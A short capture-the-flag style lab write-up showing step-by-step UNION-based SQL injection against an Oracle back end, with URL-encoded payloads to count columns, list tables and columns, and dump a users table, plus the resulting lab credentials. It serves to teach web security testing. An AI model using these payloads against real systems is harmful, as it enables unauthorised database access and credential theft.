# Lab: SQL injection attack, listing the database contents on Oracle

End Goal :

- Determine which table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Login as admin

Analysis:

1- Determine the number of the columns
`'+order+by+3+--` -> internal server error
no. of column = 2

2- Find data type of columns
Both columns accept string values
the vendor is Oracle
`'+UNION+SELECT+'A','A'+FROM+DUAL--`

3- Output the list of tables in the database

`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
->
USERS_CHJWDN

4- Output the column names of the users table

`'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+all_tab_columns+WHERE+table_name=+'USERS_CHJWDN'--`

->
USERNAME_UJTEYX
PASSWORD_JAOADM
EMAIL

5- Dump the creds

`'+UNION+SELECT+USERNAME_UJTEYX,+PASSWORD_JAOADM+FROM+USERS_CHJWDN--`

->

administrator
 likmv5lsvqnzgsaj3gx6
carlos
 ils1bzehtjxa7l8cg5y9
wiener
 ojjjzusyft47pn2q5njp
